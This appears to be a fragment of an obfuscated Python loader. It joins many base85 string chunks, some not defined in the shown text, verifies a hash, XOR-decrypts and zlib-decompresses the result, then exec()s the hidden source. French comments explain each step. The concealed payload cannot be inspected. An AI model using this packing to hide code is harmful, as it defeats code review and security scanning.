_cygl2fvu_BSL1R = 'G)DdR!kLmj1J7;{q750w-_Wt4?*HL|8Ae(XShj?hV'
_craYuLNPkiYfT8 = 'j|x6u{kwWC~)8ynWXag>6dk;Vte%6mSIAAQw_wDTC'
_cjyddtvJOJFCdr = '3{#(%F)`)=|Iw;UEaLZxdjkOlHi_{T`k-d4A&ao|U'
_cxUlraNuON3ka5 = '&I}3->zC%kVMOu=^R15i$)pF^n{@0Cew=md7p$suE'
_cbjoTzIOjSGgid = 'K80H$za?#Of#9|VRGGj0ZJ#I_A?Zugbg_-l(rUa8$'
_czTiAqLxsnuA_g = 'JvwZCyXs}xR7bZy#xqbM{^QsCz<}`!9i`Ezsk`~T+'
_caHNhK2ntuHgJu = 'yo3<4jUU^OTr3KNPTa+mfgelvhvghX>ED>Y$LW#xY'
_clUuYfDtUaeixY = 'p1kxvylIw!#9WcO=AyOL`o2>Q4XJvw>e6(O{cQjeq'
_csvqOGx94UAMt3 = 'qncECeG5xj#-V9}a=0IM~?Wc&uL;W<sC5)W#;~h24'
_cvDZhhAh_WoHSk = 'NUGvVIyF9FSCm@xa@FFUg-DqX5i=)0dfp5NW`ND!+'
_cgfdKHwjJ8z9KU = '#Bo+P<-)c`f$9h(qLSnM#O6f%1!4T$yH@UW^VaJC)'
_cwCOOXBBwqwcIs = 'Ef|+gNR-qE5Pvj-J@f!cxwST+ws=U53(pB!||5u)X'
_cl5oCgXqdg_ngO = '8*RPvfQ?HQZH7ux$NA*YWUEi)a-e%sgJ=4)@Qc$1T'
_csIRXf447LwQ3g = 'b<oB91&R}};g$}7T4YpM$*``8U)?1u+R8EzQ<he&W'
_cnOUTvfLTSX6qW = '@>?r7>po8ggprVXWN!_-$g443Qs`nZxh@DCEOQZ1q'
_cjAPWxRmEVmVfK = 'isME6e%G(UXNXc6fub!;#a+&91pf)$3h<+7i0Y9IH'
_ch3TxIWxsWCtrE = '(9}k&U}qKj+S?6;QvLE1AD=l5F}hi&1U-^u!Bl`0p'
_cerJpslV81ppDE = 'V>s+s6Ys2<dpL%BjvoA|7ys}eWM=JeHIO><-r#|K4'
_cqMfb8GnqKJEc7 = 'SkqzoJ_{vSS=u~30AvlIHgMVMQm!&5CZGI-s;Vi%g'
_crju2X0pDP8Sny = '=UatB8#GjscRX2%r)u>bZ5|pGL8!g9>P8hF@Sh>8#'
_caOZQ2RRGEpsWB = 'ya$C6%gUtDt@?cv7<E0t!g>(x|oU%c&4JqOglcQiD'
_cpgpcHoVG24Lrs = '1TqCHJJXOPik=82)xLrgWjOwzn=QkjhNBweg?Znz?'
_c_mgjtkbVqtWWa = 'UayINgclh?HxCe1-fX3=nSCq6{%_U9Qm2ElOt-km)'
_cgtxni7EQMsxOu = 'Wp^SIMLiezAMTp^>_^vbNE)~0!lOb;e!r8VF_P;V8'
_ccKAchhGoxbnWg = ')MJr258;DQ#kKv2#633VG~hSm%jqaYbyDv;fn*wPu'
_czF1wv2umflRS1 = 'iu7(1qMOpd!T*X+{Y`LS-=H>R0WG2Vok4y{*z8%57'
_chr11Vd2jxv0ez = '-8ww4d_btD!OH`3=1Z(ZgwXEqU+JN)G#dYM|dnm<V'
_cd3LUyF_loB1Y7 = 'syggTkMV9P>>4i*c=s)KEeQ@S+{4camr2LOPk)wk*'
_cjmivE8llSdHR7 = '$K|f;};o>IiI?o(vR+@)Fj7VcOflytn4#1DWn5_yk'
_caenc2MZZrQeZL = '?l6f*QN94b6!XjuDk_YiVG0G)Ff%>I(}ieAfuD#|n'
_ca5RCoDOpjEeTg = 'xOHJ>qtH@hHOStHqs^TVEVqZV5KMpEDGV<poRT9aO'
_cpK5XOkMlerQaH = 'UubzD1~rc&CH?v!`2;ect1VAx=X_{82@Yzb3UkTIx'
_cr7wmvZhgwEAGm = 'uhkmuvth1qsBvj@Eqa1C${3X*$qR~kJK=61yh)rVm'
_cf7tSqy5rcGJwh = 'rqsCT~vWyo~T7s9|To43{lQ%@(XQ@f;Gu(qQkMz13'
_cxqV_VaMFQfB7i = 'j;uI{)!rID`DOxqG+I42=61!%&>*FP0FAY42K;_c#'
_cv5fUBR9KSsXeL = 'T>X6H+H9q<apafg`K8`*bLeV>r+>Q=|Pv}EXta!XK'
_cwQm9fcrFQr2Os = 'RBo!bDS*cz3@(1T-Y#kGQb=>Ppyg=klWZVD^=5m-V'
_chlzTn04_cH5d1 = 'Oy1hg=oghPFp7c;z?L*51JL`qIjvE})|4HCY{qGEr'
_cvbFvnE2ZxGKxp = '<^N&2W@$<bAFlBN$u0wsS7e2h2T^4UMB8Ka@NQxJ>'
_ckp_wX8ocgSz7P = '2{OLq@^S6#&^W>+wHGua1hg0qlM7#cYXX?dG*EiiI'
_ccnKaJox3H4s3z = '?5JCRo#PGa$394QZ*BhyK(R(lJPiyOtCB;$+`|V(m'
_cvNnJs3j6eBqXk = 'Ft6suXT*zgVecF*c}1%F32!=5_^mPvNIKN(i_MQaR'
_cdgu4SOHl8ldeB = 'KPhZO*SB__`1{rqFRy^w5HKGNBuDE8)F^Ktja>qn6'
_ckHf_X5lp8HbbK = '7grdgp+#JcGou{SdGAqtz{(NS<{gE=1<be(H{8yyH'
_ca6D9ubQuT9rV5 = 'i};uq(!xM%1+W8qqvEw+XBgV3ztPM)qkfbM;fN!y9'
_cfZj4Jh1rJwfxA = 'ozGBoL2N=<oKAkQdp&;C?=}w0+ZWRXPDRyIi<M?K$'
_chIS9s4YGXiB9K = '}v7ciUh#lkB4F4Y+%0dE=;_Ff?QA9eQ6aNCjXv#q8'
_cpPL7xCOud37Sh = 'OM`-YBUX-d;T$m_#D9*g44)I?HM27<mXF+P-$jj13'
_cryhI1HYrS4eqs = '8G9ENgw!fRH)(f!1kwgnri8BzzgJ=_X-<`Ge09eq%'
_cvlEcdR7Hwyl9_ = ')!H;uS2W6IyK4=*ax5|+s32vEb>=w+bsK6l*>*0}7'
_cmPKlArqleLiEU = '8E_>;KUi*6bd~2Gld9#_MN-acK{-bo_(j^WJ*bmjP'
_cpwZFogMwgX0sh = '>O%CrIKK!Ggxw-m$?ZXW~K^i;jIB37fgK({}Skp~R'
_cabWIs2axMdtJ3 = '(!a602(d=M3CjVEpjz7nrXu^*mwoQl;CffLRwV#6r'
_chzm3gl_mGF_55 = '_@Sv28yn%H~v46!Z$@$nPv=aQxpTwh0ZP`sw=I#ml'
_crXSsCkT1Bu3k4 = 'iKd2*HX%S#1dN_?KECSOx@^b5W-l-s47|wAM||LIj'
_csH3Bm_j3YkrlG = 'ec&Lmfrqgmms#JOVHc37dxw}cFWONEr_;qAd^himH'
_ciX4wkuWQ3BvTK = 'R=Ukk^v=H@-ZdVeJN^Z_0dK9jC7(iQ*2U94SdjLT^'
_cmKB_RAoQg4iBN = '^5T|CP2>>IO-ow@GMp*In0&?^iz3G_CD#tbf}6zhp'
_cjHyUaWo0Mb0xI = '#aw<k~i2Vr5^j!LA4bBD2peU?OGayq!JZs9n1ASOJ'
_cocuORFGAHfe8i = 'r7Ds#Vsw&*FA4`lO5ip4B>&<tNLzfi=H;1x>G)ts`'
_cqjLvQI81ZaRel = '=%rXy4z*`JSt9*<)c?(-ZF4E6%B-$hvJgR@cs>r>}'
_ch8oMiGbgtrpW9 = 'ess01h=)IiPA`4~sE#^eD5HP@vZ)1CoODc9cYR2&s'
_cdqxKkI6ygCeeb = '`u%eLcx%1iYT++|=$$$+D~HTq*?yM;<`h(47;0$sr'
_cxzoxIqx8QmQ8x = 'U!<Zscp~f+arDrr&HG0)ns@n6hy?d!fITTLg3z`xC'
_ct0umJpF0n0VO_ = 'r3@{L%T~-*79y;`{Oyo{h0z!Wq<kUdk_+86++^XyD'
_cwDANjV8wB3UMF = '&VK?^N)HPG{1UGwXMX5rF&v3Cgh@BiIYzaTOm0`f%'
_ctouFSO0Xo3Fr_ = '`>9;va7NiFw0CI|6rPEe<|7M%yAHioFZ#{OF=Zrx{'
_cdQ8ciCAMTma4X = 'TjoaiAa;rm#GI3ghP%1Ij|X_tyZ=@Xkvd+x5lE`4r'
_cp3dfl5L_65eCT = '4z7ZhSk*2mYzAEK-v7H@(V7;KXyVHS2)Ej)(hzEbr'
_cxu1VOVendGjyw = 'mZ=0jiBfcP;BGK4g&J~_9X6s1rE>%ek|mhd*PE@ty'
_chrLOpCIIAAx9Z = 'MCWh>?!s?Vg8toS&}UZ=2O7uN2iLOi2%BC;dHVRn7'
_cjeGN_W2SaHcSC = '6IP$1`v`UC(4&!2AqX$W@tL*%67#Qy?fUNic2d&|2'
_cqdhlzdA9t04kt = '{oh;bTd-yJ<nVLf94qzj=@voUNsS}BxA!!r&kPbXj'
_cgTCR7Pe46RIQv = 'k8&ATF^aQ%!k83SYKPkXQ$)8~l@d<>a34eDgJ0q~u'
_chqdCGRfZ2y3WB = 'GqXYpcWoe1y~bb}>@KvG>w6P<)1#suvRfkTKNrwMl'
_caIH9vxEvoRF2y = 'zHP~x@f}'

_pwNGiF6FsJjc1r = __import__('base64').b85decode(_cb_O1zKySpwjVU + _ceemu5VYa71htY + _cuYRGxhN3kY8bg + _cfRwsblXpTDvkY + _cwFM3VThONSDUX + _chWIo9xHHHEPxe + _c_9nHM3zKffHTI + _ca_I8R598pZFKO + _cj0Grl6XRy0agI + _cdJ8fMIQX1rzwG + _cnKUYRbFuLqqah + _cbcZMa1fDtcvhC + _cnbh0YWWB1iayR + _cq4kEidpjy2jPn + _cdMduABGb1OAN0 + _cmILocbXVI0nZW + _cqmNlvpKKEm8CT + _cjJjRKxwwNtBgi + _ciRQjBZtChJWjG + _cxK3IAAO9q5z3s + _cqztGv7LnFYcqp + _ciIZT2QREU5YaT + _ck7trppBkik39b + _co5O6Ummxfgtp6 + _ceTHzXjabBlTjc + _cfqKQ7jpvPy487 + _cnqn6WM6BszQlN + _cvSA3AkG3fbAOR + _cv4V06n5ICFcwM + _cghncjI_L0pxkW + _cy6bAKKdyrpvDv + _cvp3b7jFYSdixO + _ccUKdnoLjQW1ve + _cvD2cYhMaDi6Dv + _czuby4HaAj8Y5n + _ccqUDpam4BEil9 + _cyzjTGiDjCF3z2 + _cq2sXb86N_QW4F + _cm9woiHMkhsUA5 + _csi8PrBKf1GBlm + _cgEOQqQaFk7Eg3 + _cvHLtyKXVf4TFe + _ctvSEmCI1lj7gW + _cbpXVgmvmYfvZg + _cshJzXvMlsoJHg + _caU8dppfNpm0i7 + _cqHwmVaINX6uYC + _cvIX3wo3EXf1mL + _ckX6T0CUOhokEs + _cshbVtcSO_7KDC + _cfNIjHCnz6_0kQ + _cgo_N_x5ufl94C + _cuUcIzyl1aBcWr + _cz26_n7sTmfwKy + _cycHC7hypU6hRK + _ckChnFc7TAqNJU + _cwR6vsPZQcAHbN + _ciSVhy7vXvpgoa + _cuZz5cQupxkpPD + _cp3vfxGPCL_f0k + _clsQbPR92CFyA2 + _cc_cnDbK5AX6i5 + _ckvzjs2HaV8QXh + _cdjHB3RsQ6DEi2 + _cwcraRIBwUbsuG + _cngJGApGjb0w4f + _cyEd8Y2eVjPMtr + _caXhLbO4153_cc + _cu7DbNRu7vB8lm + _cr7moEhuWU8gFX + _cbZbGyrlVYDO7_ + _chqK0yd26tk2rg + _cvVzuRd5HR3tRA + _cdGKSj2xVWjrR9 + _cepzvXiqVqmWrI + _ci3V7wnKMXMUfO + _cj3X2_DM4rD2NQ + _cqLTVkFjF3myFA + _cw8MpI70f4_CEr + _crEuGXBN55jTWu + _cjsZxl0a5MHL6k + _cb66N6l_2Ejq9f + _chNxGudEGGBLcS + _covmMexCWl4X3_ + _cogOXB23bXl9vZ + _cwVyhyoqnh7dzc + _cfMOXDtqUOkw_g + _crl0xuzcGeCB5L + _cwfjqgOP6KTXbB + _clIkfYHT0IuoRR + _cmxiBiim9Wj9H7 + _cePMzH1euSlP4Q + _cbo9G78UR6fVCD + _clO_vliQZ2Gm0Q + _crY_hZYHavHUWM + _clALvdKLS2XXej + _ctslM_c4vnJ8ms + _csxxffhaHWWWva + _cmgq9bqaCJ2cWf + _cqFFbzD1sKvYwU + _cv8XPbSyO9AObc + _cwZRIyL8sa1CAo + _csHQz00HjbQu6F + _clNf4or70fWqfu + _cmHmjHh6rZDslp + _cto0g0lU9G7oLy + _cxjQT_erFYuSZ1 + _ctUoflMApKra7K + _cwZe9zYRdyUunJ + _cnKta1EpPCmgzV + _coAFpp2O9AqXyl + _cclnB_VwGRNpb_ + _cvdqZ7IKpTpwkl + _cnx7e__i6Fli9p + _cxv5UULjjBB53V + _cpqQlM_3iexYpE + _chHKWpVtAgLlTs + _ci6oQbIsnv6c8g + _chq3J5CpRfR18k + _cw5c7cSjibHFQQ + _caqN9LUuz87TRD + _cudF9eJHjPnQwN + _cnwENfBxxLXdqw + _cxuHj5MdlUB5ui + _cuVlS99eSDn5Om + _cmaRRtJrLDyTvv + _clhIuZy8rlel0H + _cjKm0isUNZ5Bbb + _cl3Y01V1f374iP + _ccJ0Jc4HAjFCJZ + _cweWtDEyRnJHJd + _coa3pjK14vgw0v + _csur1gVqZ_t9kU + _cpuyq22HgAYLpQ + _clA4FE0QHYTROe + _cp29QVeYTUHQg4 + _clFhE602Fx1iMs + _c_UdxKs2cFQC3A + _ciPy7eYH7v9wCY + _cubN7KtsZF5c6l + _clb4zn902cvdPv + _ct3ytmoElnFXhl + _ceCA2irBUKiEPn + _clsX2lTR_3lpzx + _caQqRyQzY2gMCu + _cxFVVhHkXKzvpR + _cdlJTD_vrjBKZk + _cnGvaoX_ZtiGQq + _crhvVxCtbYIG0D + _cjDiCL2OsDXxL4 + _cexIU0n88HsYWv + _cdM4bnrLsuG4wX + _coMIeZiUlbsWdf + _cxLm8Y1mBM1NSF + _cp93csPv0p9N7h + _cmrILlyDcDQxYi + _cosu3CNZEob4aE + _ca0dhxteih1TiZ + _ctUA3mYeivk56f + _cvP55h6MvZ9fxX + _cmiC_zJTYzGDtN + _ceK2t1tkKmYZII + _csWVzH89rTyfrO + _ciKhPXeGfpEk2q + _ceSLMgfAoYOTj1 + _cyyOPrEDaJV13W + _ckWhijt4eVD_BC + _c_9LZBESkM7elP + _cqLOBIYLpczrzZ + _czp9bJ9m0hSihb + _cmsuDvmgx5KiAO + _crmBEuFTb_8H1B + _cceZp_QuEIujRd + _cidDqjgRH_ZceN + _coiHppjQWEHdc3 + _cgrNUNCkZOLi15 + _ckvVLTcaTHJ6If + _cfrsAKxp4jffHb + _cgu7BbbCThW22j + _cb7z_GAAleBzU7 + _caWNwtD9f_FvaI + _coITkjlp9VC0oK + _cfKIUjzbfwqwVe + _crvlvTmWbnRMDx + _cddMwxfFKVQSCw + _c_aTr3ND_96Z8N + _cwrUZHT8PPxafj + _cy8YXt_Sb4LIVQ + _cp1g2EvS9oQJIl + _cbWkPMK2Jxiywa + _csfRq0t51Lry_7 + _cisSuOBAqBYyxc + _cbqejx4vaDaYiK + _cfYV8hhhsOeGpQ + _cj7fgWtsgfA19N + _cg_o83shH6JKyG + _cva7bpKn4ysMTo + _cfBXcFRrJYA6wr + _cexRBcsehIl2JP + _chTF0OiAqIQDf7 + _cr2Micw0EwN6aX + _czZCLBVdmxseC4 + _crags5uQPFCBQb + _cdUYRvJCTNianj + _cnYhX1EHtuQayB + _cyDhs7kzSKfVE_ + _cuwF4TSVkCUCjG + _ctk2Ld2dRBopTi + _cgWlbtvdYasgCm + _cy0_QVBz9D4kQg + _cuGBqIWXnphQOb + _cduAP9X7aIh9fD + _cbcdg71hN6uF5O + _cndVWhqBOdhxBj + _cvX2bCJqNtw994 + _cmEJ_fttVrdGdr + _c_Hf8JZUUrT7CC + _cbf294YYUamIL6 + _cuXRsYs67aaxq3 + _c_UUl_fKjNQtkt + _cqrheSbWjPFD53 + _czzqEme0hy4wNx + _cdVY6YDKau5Diu + _czvE7ITO3aH9Lz + _ca2lockIc2WU6w + _cqAZ_HO0TvuiSa + _cgT162uy31NIvT + _cl_egreFq7GKKK + _cel2huj8fNPhPa + _cyu5aL0RcUys3D + _cfedIt7W_t7Wl8 + _csVo7taQS0YuRh + _ctC_PDRMabhHx2 + _cpDuzbeLvSHZXr + _cz_cCzp7J19DdG + _cx9_pZPxBT3EBJ + _cz2SCR0EtOMfxP + _csMPW5kf1zu6tq + _czRp2uBNDNH5Dp + _ckmReOFVEA5bLB + _cfQdM7rmUaL34p + _cygl2fvu_BSL1R + _craYuLNPkiYfT8 + _cjyddtvJOJFCdr + _cxUlraNuON3ka5 + _cbjoTzIOjSGgid + _czTiAqLxsnuA_g + _caHNhK2ntuHgJu + _clUuYfDtUaeixY + _csvqOGx94UAMt3 + _cvDZhhAh_WoHSk + _cgfdKHwjJ8z9KU + _cwCOOXBBwqwcIs + _cl5oCgXqdg_ngO + _csIRXf447LwQ3g + _cnOUTvfLTSX6qW + _cjAPWxRmEVmVfK + _ch3TxIWxsWCtrE + _cerJpslV81ppDE + _cqMfb8GnqKJEc7 + _crju2X0pDP8Sny + _caOZQ2RRGEpsWB + _cpgpcHoVG24Lrs + _c_mgjtkbVqtWWa + _cgtxni7EQMsxOu + _ccKAchhGoxbnWg + _czF1wv2umflRS1 + _chr11Vd2jxv0ez + _cd3LUyF_loB1Y7 + _cjmivE8llSdHR7 + _caenc2MZZrQeZL + _ca5RCoDOpjEeTg + _cpK5XOkMlerQaH + _cr7wmvZhgwEAGm + _cf7tSqy5rcGJwh + _cxqV_VaMFQfB7i + _cv5fUBR9KSsXeL + _cwQm9fcrFQr2Os + _chlzTn04_cH5d1 + _cvbFvnE2ZxGKxp + _ckp_wX8ocgSz7P + _ccnKaJox3H4s3z + _cvNnJs3j6eBqXk + _cdgu4SOHl8ldeB + _ckHf_X5lp8HbbK + _ca6D9ubQuT9rV5 + _cfZj4Jh1rJwfxA + _chIS9s4YGXiB9K + _cpPL7xCOud37Sh + _cryhI1HYrS4eqs + _cvlEcdR7Hwyl9_ + _cmPKlArqleLiEU + _cpwZFogMwgX0sh + _cabWIs2axMdtJ3 + _chzm3gl_mGF_55 + _crXSsCkT1Bu3k4 + _csH3Bm_j3YkrlG + _ciX4wkuWQ3BvTK + _cmKB_RAoQg4iBN + _cjHyUaWo0Mb0xI + _cocuORFGAHfe8i + _cqjLvQI81ZaRel + _ch8oMiGbgtrpW9 + _cdqxKkI6ygCeeb + _cxzoxIqx8QmQ8x + _ct0umJpF0n0VO_ + _cwDANjV8wB3UMF + _ctouFSO0Xo3Fr_ + _cdQ8ciCAMTma4X + _cp3dfl5L_65eCT + _cxu1VOVendGjyw + _chrLOpCIIAAx9Z + _cjeGN_W2SaHcSC + _cqdhlzdA9t04kt + _cgTCR7Pe46RIQv + _chqdCGRfZ2y3WB + _caIH9vxEvoRF2y)
if __import__('hashlib').sha256(_pwNGiF6FsJjc1r).hexdigest() != '713d3a46e2218ff2e82f6b3657c17d9b0dd91217984d19bdd3f41b1c0ee9f83f':
    __import__('sys').exit(1)
_xhmjwWKIflj7zO = bytes([195, 213, 95, 170, 118, 132, 156, 244])
_fkimQLQ0UKVJwU3 = bytes([143, 227, 56, 63, 22, 119, 249, 123])

def _fxmFNib6Gi9ldOl(_bbXT93_FiuMzmz, _ky19niIMBfwZtQ):
    return bytes(_bbXT93_FiuMzmz[_iinCjQfTFxSMS6] ^ _ky19niIMBfwZtQ[_iinCjQfTFxSMS6 % len(_ky19niIMBfwZtQ)] for _iinCjQfTFxSMS6 in range(len(_bbXT93_FiuMzmz)))

def _fdgs4OcdDCxQyLe(_tiNd3HyptJZgva):
    import zlib
    return zlib.decompress(_tiNd3HyptJZgva) # Un seul niveau de zlib ici pour simplifier

def _fetqXUirWd58s7f():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xiyNuUosEGt6bS = _fxmFNib6Gi9ldOl(_pwNGiF6FsJjc1r, _xhmjwWKIflj7zO)
    # 2. Décompression Zlib
    _ddTtnzb9kQKzyo = _fdgs4OcdDCxQyLe(_xiyNuUosEGt6bS)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _ddTtnzb9kQKzyo.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ntUseCrVELil0k = _main.__dict__
    _ntUseCrVELil0k.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ntUseCrVELil0k)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fetqXUirWd58s7f()
try:
    del _fxmFNib6Gi9ldOl, _fdgs4OcdDCxQyLe, _fetqXUirWd58s7f
    del _pwNGiF6FsJjc1r, _xhmjwWKIflj7zO, _fkimQLQ0UKVJwU3
except:
    pass
